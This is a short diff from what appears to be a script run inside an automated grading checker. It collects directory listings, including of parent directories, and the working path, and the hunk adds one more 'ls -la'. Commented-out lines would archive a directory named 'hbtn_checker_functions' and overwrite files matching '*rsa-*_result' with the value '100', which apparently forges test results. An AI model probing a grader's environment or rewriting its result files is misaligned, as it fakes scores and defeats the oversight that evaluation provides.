@@ -110,6 +110,7 @@ my_data += get_data("ls -l") or ""
 my_data += get_data("ls -la ../../../") or ""
 my_data += get_data("pwd") or ""
 my_data += "\n#######################\n"
+my_data += get_data("ls -la") or ""
 # my_data += "\n#######################\n"
 # get_data("tar -czvf file.tar.gz ../../../hbtn_checker_functions")
 # my_data += get_data("""find . -type f -name '*rsa-*_result' -exec sh -c 'echo 100 > "$1"' _ {} \\;""") or ""
